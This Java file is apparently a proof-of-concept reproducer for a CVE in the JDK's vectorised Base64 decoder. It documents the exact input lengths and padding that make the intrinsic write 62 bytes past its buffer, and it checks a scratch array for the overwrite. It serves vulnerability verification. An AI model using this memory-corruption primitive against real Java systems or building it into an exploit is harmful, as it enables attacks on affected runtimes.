import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Bounded trigger for CVE-2026-114938.
 *
 * Primitive: Quang Luong / Calif.io (public advisory).
 * Lab and trigger-length derivation: eduxcode (github.com/eduxcode).
 *
 * The trigger needs TWO conditions:
 *   - length > 128, otherwise the stub falls back to the scalar loop (gate `cmpl(length,128)`);
 *   - (length % 64) in {1,2,3}, so a 1..3 byte tail with '=' remains.
 * With 129 bytes (128 'A' + '='): two 64-byte blocks, a 1-byte tail, and the
 * 64-byte store lands at dp=96 of a 98-byte buffer -> 62 bytes past it.
 *
 * 64+'=' and 128+'=' do NOT trigger: they stay on the scalar path. Use one process
 * per length (the first exception deoptimizes decode0).
 *
 * Usage: java Base64Trigger [numberOfAs]
 */
public final class Base64Trigger {

    private static final int WARMUP = 5_000;
    private static final int SCRATCH_SIZE = 8192;
    private static volatile long sink;

    public static void main(String[] args) {
        int chars = args.length > 0 ? Integer.parseInt(args[0]) : 128;
        Base64.Decoder dec = Base64.getDecoder();

        // 192 > 128: warms up the real AVX-512 path
        byte[] valid = "A".repeat(192).getBytes(StandardCharsets.US_ASCII);
        byte[] scratch = new byte[SCRATCH_SIZE];
        long acc = 0;
        for (int i = 0; i < WARMUP; i++) acc += dec.decode(valid, scratch);
        sink = acc;

        System.out.println("runtime=" + System.getProperty("java.runtime.version"));
        System.out.println("vm=" + System.getProperty("java.vm.name"));
        boolean ok = attempt(dec, chars);
        System.out.println(ok ? "REPRODUCED" : "NOT REPRODUCED");
        System.exit(ok ? 0 : 1);
    }

    private static boolean attempt(Base64.Decoder dec, int chars) {
        int inLen = chars + 1;                                   // + '='
        int paddings = 1;
        int bufferLen = 3 * ((inLen + 3) / 4) - paddings;        // JDK allocation
        int dp = 48 * (inLen / 64);                              // tail store
        int lastExpected = dp + 63;
        int oob = lastExpected - (bufferLen - 1);

        byte[] target = new byte[SCRATCH_SIZE];
        Arrays.fill(target, (byte) 0x5a);

        boolean rejected = false;
        try {
            dec.decode(("A".repeat(chars) + "=").getBytes(StandardCharsets.US_ASCII), target);
        } catch (IllegalArgumentException expected) {
            rejected = true;                                      // rejects after writing
        }

        int changed = 0, first = -1, last = -1;
        for (int i = 0; i < target.length; i++) {
            if (target[i] != (byte) 0x5a) {
                changed++;
                if (first < 0) first = i;
                last = i;
            }
        }

        boolean tail = inLen > 128 && (inLen & 63) >= 1 && (inLen & 63) <= 3;
        boolean ok = rejected && tail && changed == lastExpected + 1
                && first == 0 && last == lastExpected && oob == 62;

        System.out.printf(
            "trigger=%dx'A'+'=' inLen=%d buffer=%d dp=%d rejected=%s changed=%d window=[%d,%d] OOB=%d -> %s%n",
            chars, inLen, bufferLen, dp, rejected, changed, first, last, oob,
            ok ? "HIT" : "no corruption");
        return ok;
    }
}
